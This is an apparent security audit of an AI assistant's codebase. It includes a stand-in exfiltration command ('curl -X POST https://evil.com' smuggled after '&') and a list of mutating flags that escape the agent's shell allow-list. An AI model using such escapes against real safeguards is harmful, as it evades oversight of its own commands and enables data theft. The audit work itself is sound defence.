# Usability Phase 4 R2 audit — R1 folds verified (2026-08-23)

Scope: uncommitted diff, 20 files + 2 new. tsc clean (src only), 938/938 scoped green,
4/4 mutation probes RED, working tree byte-restored (md5). Verdict **FIX-FIRST** (2 Critical).

## Folds that HOLD (probed, not assumed)

- **C1 (SDK-branch recovery)** — real fold. Tests mock `getConfig → claude-sdk` and ONLY
  `queryClaudeSdk` (fast-runner.integration.test.ts:912), so they exercise the branch prod
  runs (`/proc/<MainPID>/environ` still `INFERENCE_PRIMARY_PROVIDER=claude-sdk`). `sdkCapped`'s
  markers match the REAL producer: `[${error.subtype} — …]` (claude-sdk.ts:1010) and
  `[timeout after …]` (claude-sdk.ts:1177). BLOCKED-without-marker guard holds. The two
  recovery blocks are mutually exclusive — the SDK branch `return`s at fast-runner.ts:1490,
  ~25 lines before `inferWithTools`. `mergeSdkLegs` uses `first && second` for
  `costAuthoritative` — correct: a non-authoritative leg-2 demotes the pair, so the
  dispatcher's phantom-$0 guard still falls back to `calculateCost()`.
- **C3/C4** — `pending.tk === tk` + group-prefix strip. All THREE `pendingReplies.set`
  sites carry `tk` (router.ts:1628, 2362, 3585). Tests build real pendingReplies through
  `handleInbound` with mocked `submitTask` and assert "2 tareas canceladas" with a third
  GROUP-thread task untouched — genuine cross-thread isolation, not a regex test.
  (cancel.test.ts is regex-only + a source drift-guard; the behaviour lives in router.test.ts:2815.)
- **W1** — `written_text` scopes the contradiction check to the inserted text; R1's
  whole-document FP is gone. **W6** — per-kind `PIN_CAP=12` verified by probe: 50 URLs
  after 2 figures → figures=2, urls=12. No off-by-one. **S3** — oversize sheds `__confirmed`
  first; probed a realistic 800-char doc write + 5 figures = 1548 chars vs MAX_PAYLOAD 2000
  (450 char margin — shedding does NOT fire in practice). **W3/W4/W5/R4** hold as described.

## C2 fold is INCOMPLETE — same class, new members

All 7 R1 escapes now enforced (probed). But the segment split still misses a `/bin/sh`
separator, and the multi-mode-binary sweep stopped at `find`/`git branch`/`ip`/`date`/`env`:

- `journalctl -u caddy & curl -X POST https://evil.com` → **EXEMPT + shell-ALLOWED**.
  R1's headline escape with `&` instead of `\n`. `spawn("/bin/sh", ["-c", command])`
  (shell.ts:53) makes `&` a real separator. Line: `stripped.split(/[\n;]|&&|\|\||\|/)`.
- Mutating modes on DIAG_SIMPLE members, all EXEMPT + shell-ALLOWED:
  `journalctl --vacuum-time/--vacuum-size/--rotate/--flush`, `dmesg --clear|-C`,
  `sort -o FILE` / `--output=` (arbitrary file write), `uniq IN OUT`, `ss -K`,
  `git diff --output=/tmp/x`. `find` got `FIND_MUTATING_RE`; nothing else did.
- Fail-safe direction confirmed on every miss the OTHER way: `grep -P '(?:a|b)'`,
  `grep "a&&b" f`, heredocs, `git -C /path log` all split mid-token → enforced.

**Doctrine:** a shell allow-list must enumerate separators against `/bin/sh` (`;` `\n` `&`
`&&` `|` `||`) AND give every multi-mode binary its own mutating-flag regex — one
`FIND_MUTATING_RE` proves the author knew the class and swept only one member.

## New criticals R1 missed

- **SDK resume leg has no continuity.** fast-runner.ts:1349-1354 builds the resume prompt
  from `userPrompt + sdkResult.text.slice(0,4000)` and asserts *"las herramientas listadas
  arriba ya corrieron"* — but no tool list is in the prompt. `sdkResult.toolCalls` is in
  scope and unused. The openai twin (fast-runner.ts:1559) passes `...result.messages`, so
  ITS identical claim is true. Two consequences: duplicate mutating side effects
  (gmail_send / gdocs_write / tweet_post re-run), and `mergeSdkLegs` spreads `...second`
  so leg-1 TEXT is discarded — the tests bless this (leg-1 "Parte 1 del análisis…" never
  asserted to survive; delivered text is leg-2's "Análisis terminado.").
- **Timeout arm burns an undeliverable leg.** `sdkCapped` accepts `[timeout` →
  `SDK_TIMEOUT_MS = 900s` (claude-sdk.ts:646) but `TASK_TIMEOUT_ABANDON_MS = 660s`
  (router.ts:151 — its comment "past SDK 15min timeout with grace" is factually wrong).
  Chat pendingReply is already deleted, `if (!pending) return` (router.ts:2729) drops the
  result. W4's fold bounds TURNS; the timeout bound is WALL-CLOCK. Cf.
  [[v85-opensandbox-adoption-r1-audit]] "porting a timeout across runtimes changes its KIND".

## Verified-by-probe, not by reasoning

- `pinsByThread` has **no global sweep** — `prune()` deletes an empty key only when that key
  is TOUCHED. Probe: 100 seeded threads, sweep one, 99 keys survive. The comment at
  thread-pins.ts:71 ("must not keep one empty array per sender forever") over-claims.
  `confirmedByTask` DOES have an opportunistic sweep — the asymmetry is the tell.
- **SQLite `LIKE` is case-insensitive for ASCII.** `scripts/usability-metrics.ts`:
  `contRow("User: Contin%") + contRow("User: contin%")` = 16+16 = **32** for a true 16
  (GLOB splits it 15+1). A Phase 4 exit-criteria metric reading exactly 2×.
  `scripts/` is outside `tsconfig.json` `include: ["src/**/*.ts"]` — `tsc --noEmit` never saw it.

## Method notes

- `md5sum` baseline BEFORE the first mutation + `md5sum -c` after each restore is what let me
  run 4 destructive probes on an uncommitted tree with confidence. One perl regex silently
  hit the wrong line (corrupted a docstring instead of the const) and the checksum caught it —
  always re-`grep` the mutated line and confirm the intended text changed before trusting a
  GREEN result as "test not load-bearing".
- Re-run `git status` at the END: `scripts/usability-metrics.ts` appeared mid-audit from a
  parallel actor. Diff the mtime against your own edits before claiming or disclaiming it.
